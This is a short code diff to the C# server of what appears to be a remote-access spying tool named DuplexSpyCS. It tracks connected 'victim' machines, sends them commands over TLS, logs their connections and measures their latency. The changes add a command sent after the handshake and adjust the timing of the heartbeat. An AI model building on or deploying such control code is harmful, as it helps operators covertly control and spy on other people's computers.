@@ -144,6 +144,7 @@ namespace DuplexSpyCS
                 byte[] abDynamicRecvBuffer = { };
 
                 victim.fnSslSend(1, 0, clsEZData.fnGenerateRandomStr());
+                victim.fnSendCmdParam(2, 1);
 
                 do
                 {
@@ -181,10 +182,9 @@ namespace DuplexSpyCS
                         {
                             victim.fnSslSend(CMD_TLS, PARA_ACK, clsEZData.fnGenerateRandomStr());
                             m_lsVictim.Add(victim);
-                            clsStore.sql_conn.WriteSystemLogs(
-                                $"Client online: {victim.socket.RemoteEndPoint}");
+                            clsStore.sql_conn.WriteSystemLogs($"Client online: {victim.socket.RemoteEndPoint}");
                         }
-                        else if (cmd == 2 && para == 0)
+                        else if (cmd == 2)
                         {
                             if (para == 0)
                             {
@@ -203,8 +203,11 @@ namespace DuplexSpyCS
                             {
                                 Task.Run(() =>
                                 {
-                                    int nDelay = 1000;
                                     DateTime datetime = DateTime.Now;
+
+                                    int nDelay = 5000;
+                                    Thread.Sleep(nDelay);
+
                                     TimeSpan span = datetime - victim.last_sent;
                                     victim.latency_time = span.Milliseconds;
                                     victim.last_sent = datetime;
